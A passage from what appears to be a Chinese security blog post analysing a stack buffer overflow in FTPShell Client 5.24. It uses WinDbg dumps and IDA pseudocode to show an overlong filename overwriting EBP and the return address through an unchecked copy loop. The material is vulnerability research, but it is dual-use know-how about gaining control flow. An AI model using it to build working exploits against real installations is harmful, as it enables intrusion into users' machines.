0012faa8  0016ff80 0012fdd8 00db8644 005fb0f4
0:000&gt; dd 0012fbd4
0012fbd4  41414141 41414141 41414141 41414141
0012fbe4  41414141 41414141 41414141 41414141
0012fbf4  41414141 41414141 41414141 41414141
0012fc04  41414141 41414141 41414141 41414141
0012fc14  41414141 41414141 41414141 41414141
0012fc24  41414141 41414141 41414141 41414141
0012fc34  41414141 41414141 41414141 41414141
0012fc44  41414141 41414141 41414141 41414141

0:000&gt; dc 0012fa4c
0012fa4c  445c3a43 6d75636f 73746e65 646e6120  C:\Documents and
0012fa5c  74655320 676e6974 6f725c73 4d5c746f   Settings\root\M
0012fa6c  6f442079 656d7563 5c73746e 00010000  y Documents\....
0012fa7c  00000005 0012f9dc 80000000 0012fc00  ................</pre>
<p><span class="md-line md-end-block">可以看到，esp+4位置保存的第二个参数就是畸形字符串AAAA，而第一个参数就是路径，也就是说，这里会将畸形字符串拼接到路径后面组成一个完整的绝对路径。</span></p>
<p><span class="md-line md-end-block">那么接下来我们重点跟一下漏洞触发的函数sub_464A20，在函数中，我们发现了一处循环赋值操作。</span></p>
<pre class="md-fences md-end-block" lang="" contenteditable="false">0:000&gt; t
eax=00000044 ebx=0012f8af ecx=0012f83a edx=0000005c esi=0012f5e7 edi=00000000
eip=00464a97 esp=0012f5d8 ebp=0012fa34 iopl=0         nv up ei ng nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200297
ftpshell!Rcgui_mainFinalize+0x22dc7:
00464a97 7549            jne     ftpshell!Rcgui_mainFinalize+0x22e12 (00464ae2) [br=1]
0:000&gt; t
eax=00000044 ebx=0012f8af ecx=0012f83a edx=0000005c esi=0012f5e7 edi=00000000
eip=00464ae2 esp=0012f5d8 ebp=0012fa34 iopl=0         nv up ei ng nz ac pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200297
ftpshell!Rcgui_mainFinalize+0x22e12:
00464ae2 8a0b            mov     cl,byte ptr [ebx]          ds:0023:0012f8af=44
0:000&gt; dd ebx
0012f8af  75636f44 746e656d 6e612073 65532064
0012f8bf  6e697474 725c7367 5c746f6f 4420794d
0012f8cf  6d75636f 73746e65 4141415c 41414141
0012f8df  41414141 41414141 41414141 41414141
0012f8ef  41414141 41414141 41414141 41414141
0012f8ff  41414141 41414141 41414141 41414141
0012f90f  41414141 41414141 41414141 41414141</pre>
<p><span class="md-line md-end-block">就是这处赋值操作，会将畸形字符串两个字节一组拷贝到目标缓冲区，而在此前没有进行任何检查，跳过这个循环，直接到达函数末尾，观察寄存器。</span></p>
<pre class="md-fences md-end-block" lang="" contenteditable="false">0:000&gt; p
eax=00000001 ebx=00ddcc64 ecx=00000328 edx=00000328 esi=00dc36c8 edi=0012fa78
eip=00464b33 esp=0012f5e4 ebp=0012fa34 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246
ftpshell!Rcgui_mainFinalize+0x22e63:
00464b33 8be5            mov     esp,ebp
0:000&gt; p
eax=00000001 ebx=00ddcc64 ecx=00000328 edx=00000328 esi=00dc36c8 edi=0012fa78
eip=00464b35 esp=0012fa34 ebp=0012fa34 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246
ftpshell!Rcgui_mainFinalize+0x22e65:
00464b35 5d              pop     ebp
0:000&gt; p
eax=00000001 ebx=00ddcc64 ecx=00000328 edx=00000328 esi=00dc36c8 edi=0012fa78
eip=00464b36 esp=0012fa38 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246
ftpshell!Rcgui_mainFinalize+0x22e66:
00464b36 c3              ret
0:000&gt; dd esp
0012fa38  41414141 41414141 0012fe00 00cc0dc0
0012fa48  00dbaad0 445c3a43 6d75636f 73746e65
0012fa58  646e6120 74655320 676e6974 6f725c73
0012fa68  4d5c746f 6f442079 656d7563 5c73746e
0012fa78  41414141 41414141 41414141 41414141
0012fa88  41414141 41414141 41414141 41414141
0012fa98  41414141 41414141 41414141 41414141
0012faa8  41414141 41414141 41414141 41414141
0:000&gt; dd ebp
41414141  ???????? ???????? ???????? ????????
41414151  ???????? ???????? ???????? ????????
41414161  ???????? ???????? ???????? ????????
41414171  ???????? ???????? ???????? ????????
41414181  ???????? ???????? ???????? ????????
41414191  ???????? ???????? ???????? ????????</pre>
<p><span class="md-line md-end-block">可以看到函数末尾ebp和返回地址均被覆盖，返回后会到达shellcode位置。</span></p>
<p><span class="md-line md-end-block">那么接下来我们可以通过IDA的伪代码来重新梳理整个过程。首先是strcat会将畸形字符串和路径拼接成一个绝对路径。</span></p>
<pre class="md-fences md-end-block" lang="" contenteditable="false">char *__cdecl strcat(char *dest, const char *src)
{
  strcat(dest, src);
  return dest;
}</pre>
<p><span class="md-line md-end-block">接下来程序会调用sub_464A20函数，首先函数会到达一个循环赋值的位置。</span></p>
<pre class="md-fences md-end-block" lang="" contenteditable="false">  while ( *v2 )
  {
    if ( *v2 == 92 )
    {
      *v1 = 0;
      if ( v3 &lt;= 0 )
      {
        v4 = FindFirstFileA(&amp;FileName, &amp;FindFileData);
        if ( v4 == (HANDLE)-1 )
        {
          if ( !CreateDirectoryA(&amp;FileName, 0) )
            return 1;
        }
        else
        {
          FindClose(v4);
        }
      }
      else
      {
        --v3;
      }
      *v1 = *v2;
    }
    else
    {
      *v1 = *v2;
    }
    ++v2;
    ++v1;
  }</pre>
<p><span class="md-line md-end-block"><span class="">赋值结束后导致缓冲区被覆盖，产生缓冲区溢出，而在这整个过程中，并没有对路径长度进行有效的检查。</span></span></p>
<p>&nbsp;</p>
<p style="text-align: center;"><span style="color: #ff0000;"><strong>*作者：<span style="color: #ff0000;"><a style="color: #ff0000;" href="http://whereisk0shl.top/post/2017-04-23">k0shl</a></span>，转载请注明来自MottoIN</strong></span></p>
                                                        <div class="entry-copyright"><p>原创文章，作者：Jarry，如若转载，请注明出处：http://www.mottoin.com/101175.html</p></div>                        </div>
                        <div class="entry-footer">
                            <div class="entry-tag"><a href="http://www.mottoin.com/tag/ftpshell" rel="tag">FTPSHELL</a><a href="http://www.mottoin.com/tag/%e6%bc%8f%e6%b4%9e" rel="tag">漏洞</a><a href="http://www.mottoin.com/tag/%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90" rel="tag">漏洞分析</a><a href="http://www.mottoin.com/tag/%e7%bc%93%e5%86%b2%e5%8c%ba%e6%ba%a2%e5%87%ba" rel="tag">缓冲区溢出</a></div>
                            <div class="entry-action">
                                <div class="btn-zan" data-id="101175"><i class="fa fa-thumbs-up"></i> 赞 <span class="entry-action-num">(0)</span></div>

                                
                            </div>
                            <div class="entry-bar">
                                <div class="entry-bar-inner clearfix">
                                                                            <div class="author pull-left">
                                            <a data-user="12" target="_blank" href="http://www.mottoin.com/user/hypnos/" class="avatar">
                                                <img src="http://gravatar.com/avatar/?s=400&d=mm" class="func-um_user gravatar avatar avatar-60 um-avatar um-avatar-gravatar" width="60" height="60" alt="Jarry" />                                                Jarry                                            </a>
                                            <span class="author-title">普通用户</span>                                         </div>
                                                                        <div class="info pull-right">
                                        <div class="info-item meta">
                                            <a class="meta-item j-heart" href="javascript:;" data-id="101175"><i class="fa fa-heart"></i> <span class="data">0</span></a>
                                            <a class="meta-item" href="#comments"><i class="fa fa-comment"></i> <span class="data">0</span></a>
                                                                                    </div>
                                        <div class="info-item share">
                                            <a class="meta-item" href="javascript:;">
                                                <i class="fa fa-wechat"></i>
                                                <span class="wx-wrap">
                                                    <img src="//pan.baidu.com/share/qrcode?w=320&h=320&url=http://www.mottoin.com/101175.html">
                                                    <span>扫码分享到微信</span>
                                                </span>
                                            </a>
                                            <a class="meta-item" href="http://share.baidu.com/s?type=text&searchPic=1&sign=on&to=tsina&key=&url=http%3A%2F%2Fwww.mottoin.com%2F101175.html&title=FTPSHELL+CLIENT+5.24%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E5%8A%9F%E8%83%BD%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E" target="_blank"><i class="fa fa-weibo"></i></a>
                                            <a class="meta-item" href="http://share.baidu.com/s?type=text&searchPic=1&sign=on&to=qzone&key=&url=http%3A%2F%2Fwww.mottoin.com%2F101175.html&title=FTPSHELL+CLIENT+5.24%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E5%8A%9F%E8%83%BD%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E" target="_blank"><i class="fa fa-qq"></i></a>
                                        </div>
                                        <div class="info-item act">
                                            <a href="javascript:;" id="j-reading"><i class="fa fa-file-text"></i></a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                                                        <h3 class="entry-related-title">相关推荐</h3><ul class="entry-related clearfix"><li><a href="http://www.mottoin.com/98420.html" title="[CVE-2011-5165]FREE MP3 CD RIPPER本地代码执行漏洞">[CVE-2011-5165]FREE MP3 CD RIPPER本地代码执行漏洞</a></li><li><a href="http://www.mottoin.com/97425.html" title="多款密码管理器应用程序的安全漏洞">多款密码管理器应用程序的安全漏洞</a></li><li><a href="http://www.mottoin.com/101673.html" title="DESTINY MEDIA PLAYER 1.61 &#8216;M3U&#8217;文件格式缓冲区溢出漏洞">DESTINY MEDIA PLAYER 1.61 &#8216;M3U&#8217;文件格式缓冲区溢出漏洞</a></li><li><a href="http://www.mottoin.com/101779.html" title="[CVE-2016-10033]WordPress &lt; 4.7.1远程代码执行漏洞分析">[CVE-2016-10033]WordPress < 4.7.1远程代码执行漏洞分析</a></li><li><a href="http://www.mottoin.com/99247.html" title="漏洞分析：CVE-2017-0497 via ele7enxxh">漏洞分析：CVE-2017-0497 via ele7enxxh</a></li><li><a href="http://www.mottoin.com/102572.html" title="【万年漏洞王】Struts2受影响情况数据报告">【万年漏洞王】Struts2受影响情况数据报告</a></li><li><a href="http://www.mottoin.com/104687.html" title="高通加解密引擎提权漏洞解析">高通加解密引擎提权漏洞解析</a></li><li><a href="http://www.mottoin.com/102714.html" title="命令注入雅虎的生产服务器：重新认识双引号和分号的威力">命令注入雅虎的生产服务器：重新认识双引号和分号的威力</a></li><li><a href="http://www.mottoin.com/94071.html" title="Nagios Core 代码执行漏洞（CVE-2016-9565）分析">Nagios Core 代码执行漏洞（CVE-2016-9565）分析</a></li><li><a href="http://www.mottoin.com/101846.html" title="SAML的脆弱性分析">SAML的脆弱性分析</a></li></ul>                        </div>
                        
<div id="comments" class="entry-comments">
    	<div id="respond" class="comment-respond">
		<h3 id="reply-title" class="comment-reply-title">发表评论 <small><a rel="nofollow" id="cancel-comment-reply-link" href="/101175.html#respond" style="display:none;">取消回复</a></small></h3><div class="comment-form"><div class="comment-must-login">请登录后评论...</div><div class="form-submit"><div class="form-submit-text pull-left"><a href="http://www.mottoin.com/login">登录</a>后才能评论</div> <input name="submit" type="submit" id="must-submit" class="submit" value="发表"></div></div>	</div><!-- #respond -->
		</div><!-- .comments-area -->                    </div>
                </article>
                    </div>
        <aside class="sidebar">
            <div id="profile-3" class="widget widget_profile">                <div class="cover_photo"></div>
                        <div class="avatar-wrap">
                <a target="_blank" href="http://www.mottoin.com/user/hypnos/" class="avatar-link"><img src="http://gravatar.com/avatar/?s=400&d=mm" class="func-um_user gravatar avatar avatar-120 um-avatar um-avatar-gravatar" width="120" height="120" alt="Jarry" /></a></div>
            <div class="profile-info">
                <p><span class="author-name">Jarry</span><span class="author-title">普通用户</span></p>
                <p class="author-description"></p>
            </div>
            <div class="profile-posts">
                <h3 class="widget-title"><span>最近文章</span></h3>
                <ul>                    <li><a href="http://www.mottoin.com/101885.html" title="登录工程：现代Web应用中的身份验证技术">登录工程：现代Web应用中的身份验证技术</a></li>
                                    <li><a href="http://www.mottoin.com/101846.html" title="SAML的脆弱性分析">SAML的脆弱性分析</a></li>
                                    <li><a href="http://www.mottoin.com/101811.html" title="网络安全存隐患 研究发现工业机器人极易被黑">网络安全存隐患 研究发现工业机器人极易被黑</a></li>
                                    <li><a href="http://www.mottoin.com/101798.html" title="使用Netcat[nc]连接payload的两种方式">使用Netcat[nc]连接payload的两种方式</a></li>
                                    <li><a href="http://www.mottoin.com/101705.html" title="PowerShell注入技巧：无盘持久性和绕过技术">PowerShell注入技巧：无盘持久性和绕过技术</a></li>
                </ul>            </div>
            </div><div id="custom_html-3" class="widget_text widget widget_custom_html"><div class="textwidget custom-html-widget"><a class="btn-post" href="/question"><i class="fa fa-edit"></i> 我要提问</a></div></div><div id="post-thumb-3" class="widget widget_post_thumb">            <ul>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105921.html" title="“黑客反击”的合法化之争">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/170918-Cox-The-Hackers-Hitting-Back-At-Cybercriminals-hero_vkcor5-480x300.gif" width="480" height="300" alt="“黑客反击”的合法化之争">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105921.html" title="“黑客反击”的合法化之争">“黑客反击”的合法化之争</a></p>
                            <p class="item-date">2017年9月20日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105917.html" title="美参议员要求电信巨头们回应SS7信令系统的安全问题">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG929-480x300.jpeg" width="480" height="300" alt="美参议员要求电信巨头们回应SS7信令系统的安全问题">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105917.html" title="美参议员要求电信巨头们回应SS7信令系统的安全问题">美参议员要求电信巨头们回应SS7信令系统的安全问题</a></p>
                            <p class="item-date">2017年9月19日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105914.html" title="美国国土安全部发布禁止使用卡巴斯基产品的明细">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG928-480x300.jpeg" width="480" height="300" alt="美国国土安全部发布禁止使用卡巴斯基产品的明细">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105914.html" title="美国国土安全部发布禁止使用卡巴斯基产品的明细">美国国土安全部发布禁止使用卡巴斯基产品的明细</a></p>
                            <p class="item-date">2017年9月19日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105885.html" title="【威胁预警】供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG906-480x300.jpeg" width="480" height="300" alt="【威胁预警】供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105885.html" title="【威胁预警】供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）">【威胁预警】供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）</a></p>
                            <p class="item-date">2017年9月19日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105879.html" title="全球首款网络安全概念车驶入上海滩">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/15057198871-480x300.png" width="480" height="300" alt="全球首款网络安全概念车驶入上海滩">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105879.html" title="全球首款网络安全概念车驶入上海滩">全球首款网络安全概念车驶入上海滩</a></p>
                            <p class="item-date">2017年9月18日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105872.html" title="暗网市场上开始兜售Equifax的数据，数据泄漏后常见的诈骗招数1、2、3">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG897-480x300.jpeg" width="480" height="300" alt="暗网市场上开始兜售Equifax的数据，数据泄漏后常见的诈骗招数1、2、3">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105872.html" title="暗网市场上开始兜售Equifax的数据，数据泄漏后常见的诈骗招数1、2、3">暗网市场上开始兜售Equifax的数据，数据泄漏后常见的诈骗招数1、2、3</a></p>
                            <p class="item-date">2017年9月18日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105865.html" title="美国财政部确认伊朗11个实体的恶意网络活动，宣布对它们实施制裁">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG896-480x300.jpeg" width="480" height="300" alt="美国财政部确认伊朗11个实体的恶意网络活动，宣布对它们实施制裁">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105865.html" title="美国财政部确认伊朗11个实体的恶意网络活动，宣布对它们实施制裁">美国财政部确认伊朗11个实体的恶意网络活动，宣布对它们实施制裁</a></p>
                            <p class="item-date">2017年9月18日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105858.html" title="DHS称美国政府不能正确评估 WannaCry 和NotPetya的影响，对企业缺乏适当的保护">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG150-480x300.jpeg" width="480" height="300" alt="DHS称美国政府不能正确评估 WannaCry 和NotPetya的影响，对企业缺乏适当的保护">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105858.html" title="DHS称美国政府不能正确评估 WannaCry 和NotPetya的影响，对企业缺乏适当的保护">DHS称美国政府不能正确评估 WannaCry 和NotPetya的影响，对企业缺乏适当的保护</a></p>
                            <p class="item-date">2017年9月17日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105847.html" title="国家网络安全周开幕 大安全时代360前沿“黑科技”震撼登场">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG141-480x300.jpeg" width="480" height="300" alt="国家网络安全周开幕 大安全时代360前沿“黑科技”震撼登场">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105847.html" title="国家网络安全周开幕 大安全时代360前沿“黑科技”震撼登场">国家网络安全周开幕 大安全时代360前沿“黑科技”震撼登场</a></p>
                            <p class="item-date">2017年9月16日</p>
                        </div>
                    </li>
                                    <li class="item">
                                                    <div class="item-img">
                                <a href="http://www.mottoin.com/105837.html" title="黑客组织OurMine窃取Vevo约3.12TB数据，疑似后者已妥协">
                                    <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG132-480x300.jpeg" width="480" height="300" alt="黑客组织OurMine窃取Vevo约3.12TB数据，疑似后者已妥协">                                </a>
                            </div>
                                                <div class="item-content">
                            <p class="item-title"><a href="http://www.mottoin.com/105837.html" title="黑客组织OurMine窃取Vevo约3.12TB数据，疑似后者已妥协">黑客组织OurMine窃取Vevo约3.12TB数据，疑似后者已妥协</a></p>
                            <p class="item-date">2017年9月16日</p>
                        </div>
                    </li>
                            </ul>
        </div><div id="lastest-products-4" class="widget widget_lastest_products">            <ul class="p-list clearfix">
                                    <li class="col-xs-12 col-md-6 p-item">
                        <div class="p-item-wrap">
                            <a class="thumb" href="http://www.mottoin.com/105921.html">
                                <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/170918-Cox-The-Hackers-Hitting-Back-At-Cybercriminals-hero_vkcor5-480x300.gif" width="480" height="300" alt="“黑客反击”的合法化之争">                            </a>
                            <h4 class="title">
                                <a href="http://www.mottoin.com/105921.html" title="“黑客反击”的合法化之争">
                                    “黑客反击”的合法化之争                                </a>
                            </h4>
                        </div>
                    </li>
                                    <li class="col-xs-12 col-md-6 p-item">
                        <div class="p-item-wrap">
                            <a class="thumb" href="http://www.mottoin.com/105858.html">
                                <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG150-480x300.jpeg" width="480" height="300" alt="DHS称美国政府不能正确评估 WannaCry 和NotPetya的影响，对企业缺乏适当的保护">                            </a>
                            <h4 class="title">
                                <a href="http://www.mottoin.com/105858.html" title="DHS称美国政府不能正确评估 WannaCry 和NotPetya的影响，对企业缺乏适当的保护">
                                    DHS称美国政府不能正确评估 WannaCry 和NotPetya的影响，对企业缺乏适当的保护                                </a>
                            </h4>
                        </div>
                    </li>
                                    <li class="col-xs-12 col-md-6 p-item">
                        <div class="p-item-wrap">
                            <a class="thumb" href="http://www.mottoin.com/105847.html">
                                <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG141-480x300.jpeg" width="480" height="300" alt="国家网络安全周开幕 大安全时代360前沿“黑科技”震撼登场">                            </a>
                            <h4 class="title">
                                <a href="http://www.mottoin.com/105847.html" title="国家网络安全周开幕 大安全时代360前沿“黑科技”震撼登场">
                                    国家网络安全周开幕 大安全时代360前沿“黑科技”震撼登场                                </a>
                            </h4>
                        </div>
                    </li>
                                    <li class="col-xs-12 col-md-6 p-item">
                        <div class="p-item-wrap">
                            <a class="thumb" href="http://www.mottoin.com/105799.html">
                                <img width="480" height="300" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" class="attachment-post-thumbnail size-post-thumbnail j-lazy wp-post-image" alt="暗网系列之：“入店行窃者”的工具、战术和克星" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/15054708381-150x150-480x300.png" />                            </a>
                            <h4 class="title">
                                <a href="http://www.mottoin.com/105799.html" title="暗网系列之：“入店行窃者”的工具、战术和克星">
                                    暗网系列之：“入店行窃者”的工具、战术和克星                                </a>
                            </h4>
                        </div>
                    </li>
                                    <li class="col-xs-12 col-md-6 p-item">
                        <div class="p-item-wrap">
                            <a class="thumb" href="http://www.mottoin.com/105703.html">
                                <img width="480" height="300" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" class="attachment-post-thumbnail size-post-thumbnail j-lazy wp-post-image" alt="【现场还原】补天漏洞情报发布会记事" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG82-150x150-480x300.jpeg" />                            </a>
                            <h4 class="title">
                                <a href="http://www.mottoin.com/105703.html" title="【现场还原】补天漏洞情报发布会记事">
                                    【现场还原】补天漏洞情报发布会记事                                </a>
                            </h4>
                        </div>
                    </li>
                                    <li class="col-xs-12 col-md-6 p-item">
                        <div class="p-item-wrap">
                            <a class="thumb" href="http://www.mottoin.com/105692.html">
                                <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG75-480x300.jpeg" width="480" height="300" alt="SyScan360看点回顾：中美德俄等七国黑客专家神技大比拼">                            </a>
                            <h4 class="title">
                                <a href="http://www.mottoin.com/105692.html" title="SyScan360看点回顾：中美德俄等七国黑客专家神技大比拼">
                                    SyScan360看点回顾：中美德俄等七国黑客专家神技大比拼                                </a>
                            </h4>
                        </div>
                    </li>
                                    <li class="col-xs-12 col-md-6 p-item">
                        <div class="p-item-wrap">
                            <a class="thumb" href="http://www.mottoin.com/105642.html">
                                <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG58-480x300.jpeg" width="480" height="300" alt="大安全时代序幕开启！ 中国互联网安全大会重新定义网络安全">                            </a>
                            <h4 class="title">
                                <a href="http://www.mottoin.com/105642.html" title="大安全时代序幕开启！ 中国互联网安全大会重新定义网络安全">
                                    大安全时代序幕开启！ 中国互联网安全大会重新定义网络安全                                </a>
                            </h4>
                        </div>
                    </li>
                                    <li class="col-xs-12 col-md-6 p-item">
                        <div class="p-item-wrap">
                            <a class="thumb" href="http://www.mottoin.com/105621.html">
                                <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG512-480x300.jpeg" width="480" height="300" alt="【重磅推出】ISC大会补天漏洞情报服务发布会：英雄，你准备好了吗？">                            </a>
                            <h4 class="title">
                                <a href="http://www.mottoin.com/105621.html" title="【重磅推出】ISC大会补天漏洞情报服务发布会：英雄，你准备好了吗？">
                                    【重磅推出】ISC大会补天漏洞情报服务发布会：英雄，你准备好了吗？                                </a>
                            </h4>
                        </div>
                    </li>
                                    <li class="col-xs-12 col-md-6 p-item">
                        <div class="p-item-wrap">
                            <a class="thumb" href="http://www.mottoin.com/105629.html">
                                <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG49-480x300.jpeg" width="480" height="300" alt="ISC直击：360守护者计划登陆ISC 最强白帽挑战黑客马拉松大奖赛">                            </a>
                            <h4 class="title">
                                <a href="http://www.mottoin.com/105629.html" title="ISC直击：360守护者计划登陆ISC 最强白帽挑战黑客马拉松大奖赛">
                                    ISC直击：360守护者计划登陆ISC 最强白帽挑战黑客马拉松大奖赛                                </a>
                            </h4>
                        </div>
                    </li>
                                    <li class="col-xs-12 col-md-6 p-item">
                        <div class="p-item-wrap">
                            <a class="thumb" href="http://www.mottoin.com/105603.html">
                                <img class="j-lazy" src="http://www.mottoin.com/wp-content/themes/JustNews/themer/assets/images/lazy.png" data-original="http://www.mottoin.com/wp-content/uploads/2017/09/WechatIMG42-480x300.jpeg" width="480" height="300" alt="【ISC2017精彩剪辑】周鸿祎：大安全时代 网络空间防御刻不容缓">                            </a>
                            <h4 class="title">
                                <a href="http://www.mottoin.com/105603.html" title="【ISC2017精彩剪辑】周鸿祎：大安全时代 网络空间防御刻不容缓">
                                    【ISC2017精彩剪辑】周鸿祎：大安全时代 网络空间防御刻不容缓                                </a>
                            </h4>
                        </div>
                    </li>
                            </ul>
        </div>        </aside>
    </div>
<div class="modal" id="login-modal">
    <div class="modal-dialog modal-sm">
        <div class="modal-content">
            <div class="modal-header">
                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
                <h4 class="modal-title">请登录</h4>
            </div>
            <div class="modal-body login-modal-body">
                <p>您还未登录，请登录后再进行相关操作！</p>
                <div class="login-btn">
                    <a class="btn btn-login" href="http://www.mottoin.com/login">登 录</a>
                    <a class="btn btn-register" href="http://www.mottoin.com/register">注 册</a>
                </div>
            </div>
        </div>
    </div>
</div>
</div>
<footer class="footer">
    <div class="container">
        <div class="clearfix">
                        <div class="footer-col footer-col-logo">
                <img src="http://www.mottoin.com/img/mottoin/tmxk.png" alt="MottoIN">
            </div>
                        <div class="footer-col footer-col-copy">
                <ul class="footer-nav hidden-xs"><li id="menu-item-104182" class="menu-item menu-item-104182"><a href="http://www.mottoin.com/about">关于我们</a></li>
<li id="menu-item-104181" class="menu-item menu-item-104181"><a href="http://www.mottoin.com/dis">免责声明</a></li>
<li id="menu-item-104183" class="menu-item menu-item-104183"><a href="http://www.mottoin.com/joinus">加入我们</a></li>
<li id="menu-item-105509" class="menu-item menu-item-105509"><a href="http://www.mottoin.com/contact">联系我们</a></li>
<li id="menu-item-104184" class="menu-item menu-item-104184"><a href="http://www.mottoin.com/report">寻求报道</a></li>
<li id="menu-item-104185" class="menu-item menu-item-104185"><a href="http://www.mottoin.com/contribute">我要投稿</a></li>
</ul>                <div class="copyright">
                    Copyright © 2017 MottoIN 版权所有 <a href="http://www.miibeian.gov.cn/">沪ICP备16010654号-5</a>  <img class="alignnone " src="http://www.mottoin.com/img/mottoin/ga.png" width="16" height="16" /> <a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=31010402001331">沪公网安备31010402001331号</a>                 </div>
            </div>
            <div class="footer-col footer-col-sns">
                <div class="footer-sns">
                                                                                    <a class="sns-wx" href="javascript:;">
                            <i class="fa fa-weixin"></i>
                            <span style="background-image:url(http://www.mottoin.com/img/mottoin/weixin.jpg);"></span>
                        </a>
                                                                <a target="_blank" href="http://weibo.com/mottoin" rel="nofollow"><i class="fa fa-weibo"></i></a>
